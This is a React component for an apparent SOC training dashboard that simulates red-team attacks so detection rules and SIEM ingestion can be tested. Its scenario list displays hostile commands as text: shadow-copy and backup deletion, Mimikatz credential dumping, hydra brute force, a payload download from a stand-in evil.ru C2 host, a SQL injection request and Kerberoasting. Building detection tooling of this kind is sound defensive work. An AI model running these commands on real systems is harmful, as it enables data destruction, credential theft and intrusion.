import React, { useState } from 'react';
import { 
  Zap, 
  ShieldAlert, 
  Terminal, 
  Flame, 
  Key, 
  Globe, 
  Database, 
  Cpu, 
  CheckCircle2, 
  Play,
  Settings,
  HelpCircle,
  Code2,
  Lock,
  Skull
} from 'lucide-react';
import { playThreatAlarm, playCyberClick } from '../utils/audio';

export default function AttackSimulator({ onTriggerAttack, isSimulating }) {
  const [selectedTarget, setSelectedTarget] = useState('FIN-SERVER-02');
  const [attackerIp, setAttackerIp] = useState('185.220.101.5');
  const [activePayloadView, setActivePayloadView] = useState('RANSOMWARE');
  const [simLogStream, setSimLogStream] = useState([
    `[${new Date().toLocaleTimeString()}] Red Team Attack Simulation Ground initialized. Ready for telemetry adversary testing.`
  ]);

  const attackScenarios = [
    {
      id: 'RANSOMWARE',
      name: 'Ransomware & Shadow Copy Deletion',
      mitre: 'T1490 - Inhibit System Recovery',
      severity: 'CRITICAL',
      icon: Flame,
      color: 'from-red-600 to-rose-700',
      payloadCode: `vssadmin.exe delete shadows /all /quiet\nwbadmin DELETE SYSTEMSTATEBACKUP\nbcdedit /set {default} recoveryenabled No\nbcdedit /set {default} bootstatuspolicy ignoreallfailures`,
      description: 'Simulates shadow copy wipe via vssadmin.exe followed by rapid file encryption on high-value finance server.'
    },
    {
      id: 'CREDENTIAL_DUMPING',
      name: 'LSASS Memory Credential Dumping',
      mitre: 'T1003.001 - OS Credential Dumping: LSASS',
      severity: 'CRITICAL',
      icon: Key,
      color: 'from-purple-600 to-indigo-700',
      payloadCode: `privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\nsekurlsa::pth /user:Administrator /domain:CORP /ntlm:a8f09d...`,
      description: 'Simulates Mimikatz execution targeting LSASS process memory to harvest domain admin NTLM hashes.'
    },
    {
      id: 'BRUTE_FORCE',
      name: 'SSH / RDP Authentication Brute Force',
      mitre: 'T1110.001 - Password Guessing',
      severity: 'HIGH',
      icon: Zap,
      color: 'from-amber-500 to-orange-600',
      payloadCode: `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 -t 16\n[ATTEMPT 1-150]: Failed authentication for user 'root' port 22`,
      description: 'Launches high-frequency failed authentication stream from rogue external Tor exit node IP.'
    },
    {
      id: 'C2_BEACON',
      name: 'C2 DNS Heartbeat Beaconing',
      mitre: 'T1071.004 - DNS Command & Control',
      severity: 'HIGH',
      icon: Globe,
      color: 'from-cyan-500 to-blue-600',
      payloadCode: `nslookup -q=TXT d34db33f.beacon.evil.ru 8.8.8.8\nInvoke-WebRequest -Uri 'http://c2-server-x9.evil.ru/stage2.bin' -OutFile 'C:\\Windows\\Temp\\srv.dll'`,
      description: 'Simulates compromised host sending DNS queries to known APT29 command & control domain.'
    },
    {
      id: 'SQL_INJECTION',
      name: 'SQL Injection Web App Exploit',
      mitre: 'T1190 - Exploit Public Application',
      severity: 'HIGH',
      icon: Database,
      color: 'from-emerald-500 to-teal-600',
      payloadCode: `GET /api/users?id=1%20UNION%20SELECT%20username,%20password_hash%20FROM%20admin_users--\nUser-Agent: sqlmap/1.7.2#dev`,
      description: 'Executes malicious SQL query payloads against public web application database endpoint.'
    },
    {
      id: 'PRIV_ESC',
      name: 'Token Impersonation & Kerberoasting',
      mitre: 'T1558.003 - Kerberoasting',
      severity: 'HIGH',
      icon: Skull,
      color: 'from-pink-600 to-rose-700',
      payloadCode: `GetUserSPNs.py -request -dc-ip 192.168.1.10 CORP.LOCAL/user:Password123\nhashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt`,
      description: 'Requests TGS service tickets for SPNs to crack Kerberos hashes offline for lateral movement.'
    }
  ];

  const handleLaunch = async (scenario) => {
    playThreatAlarm();
    
    // Add simulation output feed
    const nowStr = new Date().toLocaleTimeString();
    setSimLogStream(prev => [
      `[${nowStr}] [!] LAUNCHING SIMULATION: ${scenario.name}`,
      `[${nowStr}] [*] TARGET: ${selectedTarget} | ATTACKER: ${attackerIp}`,
      `[${nowStr}] [*] EXECUTING PAYLOAD: ${scenario.payloadCode.split('\n')[0]}`,
      ...prev
    ]);

    await onTriggerAttack(scenario.id, selectedTarget, attackerIp);

    const finishStr = new Date().toLocaleTimeString();
    setSimLogStream(prev => [
      `[${finishStr}] [+] SUCCESS: Telemetry logs generated & SIEM correlation triggered for ${scenario.mitre}.`,
      ...prev
    ]);
  };

  const selectedScenario = attackScenarios.find(s => s.id === activePayloadView) || attackScenarios[0];

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="cyber-card p-6 bg-gradient-to-r from-red-950/40 via-cyber-panel to-cyber-panel border-l-4 border-l-red-500 shadow-glow-red/20">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <div className="flex items-center space-x-2 text-red-400 font-mono text-xs font-bold uppercase tracking-wider mb-1">
              <Flame className="w-4 h-4 animate-pulse" />
              <span>Red Team Adversary Simulation Ground</span>
            </div>
            <h2 className="text-xl font-bold text-slate-100 font-mono">Adversary Attack Simulation Suite</h2>
            <p className="text-xs text-slate-400 mt-1 max-w-2xl leading-relaxed">
              Safely emulate real-world APT cyber attack techniques inside the lab environment to test SIEM telemetry ingestion, validate Sigma detection rules, and trigger automated SOAR containment playbooks.
            </p>
          </div>

          {/* Configuration Form */}
          <div className="flex items-center space-x-3 bg-cyber-bg p-3 rounded-lg border border-cyber-border">
            <div>
              <label className="block text-[10px] font-mono text-slate-400 uppercase">Target Host</label>
              <select 
                value={selectedTarget} 
                onChange={(e) => { playCyberClick(); setSelectedTarget(e.target.value); }}
                className="bg-cyber-panel text-xs text-slate-200 border border-cyber-border rounded px-2.5 py-1.5 focus:outline-none focus:border-cyan-500 font-mono"
              >
                <option value="FIN-SERVER-02">FIN-SERVER-02 (Finance DB)</option>
                <option value="DC-01">DC-01 (Domain Controller)</option>
                <option value="WORKSTATION-88">WORKSTATION-88 (Exec PC)</option>
                <option value="WEB-APP-01">WEB-APP-01 (Public Web)</option>
                <option value="GW-01">GW-01 (Auth Gateway)</option>
              </select>
            </div>

            <div>
              <label className="block text-[10px] font-mono text-slate-400 uppercase">Attacker IP</label>
              <input 
                type="text" 
                value={attackerIp} 
                onChange={(e) => setAttackerIp(e.target.value)}
                className="bg-cyber-panel text-xs text-slate-200 border border-cyber-border rounded px-2.5 py-1.5 font-mono w-36 focus:outline-none focus:border-cyan-500"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Attack Scenario Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
        {attackScenarios.map((scenario) => {
          const Icon = scenario.icon;
          return (
            <div 
              key={scenario.id} 
              className="cyber-card p-5 flex flex-col justify-between hover:border-red-500/50 hover:shadow-glow-red group transition-all"
            >
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div className={`p-3 rounded-xl bg-gradient-to-br ${scenario.color} text-white shadow-lg`}>
                    <Icon className="w-6 h-6" />
                  </div>
                  <span className={`cyber-badge ${
                    scenario.severity === 'CRITICAL' ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                  }`}>
                    {scenario.severity}
                  </span>
                </div>

                <div>
                  <h3 className="text-base font-bold text-slate-100 group-hover:text-cyan-300 transition-colors font-mono">
                    {scenario.name}
                  </h3>
                  <span className="font-mono text-xs text-cyan-400 font-semibold">{scenario.mitre}</span>
                </div>

                <p className="text-xs text-slate-400 leading-relaxed">
                  {scenario.description}
                </p>
              </div>

              <div className="mt-5 pt-3 border-t border-cyber-border flex items-center justify-between">
                <button
                  onClick={() => { playCyberClick(); setActivePayloadView(scenario.id); }}
                  className="text-xs font-mono text-slate-400 hover:text-cyan-300 flex items-center space-x-1"
                >
                  <Code2 className="w-3.5 h-3.5" />
                  <span>View Payload</span>
                </button>

                <button
                  onClick={() => handleLaunch(scenario)}
                  disabled={isSimulating}
                  className="px-4 py-2 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white rounded-lg text-xs font-bold shadow-glow-red transition flex items-center space-x-1.5 disabled:opacity-50"
                >
                  <Play className="w-3.5 h-3.5 fill-current" />
                  <span>Launch Attack</span>
                </button>
              </div>
            </div>
          );
        })}
      </div>

      {/* Payload Inspector & Real-time Console */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Payload Script Inspector */}
        <div className="lg:col-span-5 cyber-card p-5 flex flex-col justify-between">
          <div className="flex items-center justify-between pb-3 border-b border-cyber-border">
            <div className="flex items-center space-x-2">
              <Code2 className="w-5 h-5 text-purple-400" />
              <h3 className="text-sm font-bold text-slate-100 font-mono">Exploit Payload Syntax ({selectedScenario.name})</h3>
            </div>
          </div>

          <div className="my-3 p-3.5 bg-[#05080f] rounded-lg border border-cyber-border font-mono text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap leading-relaxed">
            {selectedScenario.payloadCode}
          </div>

          <div className="text-xs font-mono text-slate-500">
            MITRE ATT&CK Technique ID: <strong className="text-cyan-400">{selectedScenario.mitre}</strong>
          </div>
        </div>

        {/* Real-time Attack Terminal Output Log */}
        <div className="lg:col-span-7 cyber-card p-5 flex flex-col justify-between">
          <div className="flex items-center justify-between pb-3 border-b border-cyber-border">
            <div className="flex items-center space-x-2">
              <Terminal className="w-5 h-5 text-cyan-400" />
              <h3 className="text-sm font-bold text-slate-100 font-mono">Live Adversary Execution Console</h3>
            </div>
            <span className="text-xs text-slate-500 font-mono">STREAM ACTIVE</span>
          </div>

          <div className="my-3 h-48 rounded-lg border border-cyber-border bg-[#05080f] p-4 font-mono text-xs text-slate-300 overflow-y-auto space-y-1.5">
            {simLogStream.map((log, i) => (
              <div key={i} className="flex items-start space-x-2">
                <span className="text-cyan-400">❯</span>
                <span className={
                  log.includes('SUCCESS') ? 'text-emerald-400 font-semibold' : (log.includes('LAUNCHING') ? 'text-red-400 font-bold' : 'text-slate-300')
                }>
                  {log}
                </span>
              </div>
            ))}
          </div>

          <div className="text-xs font-mono text-slate-500">
            Events ingested into SOC Sentinel Detection Core in real-time.
          </div>
        </div>
      </div>
    </div>
  );
}
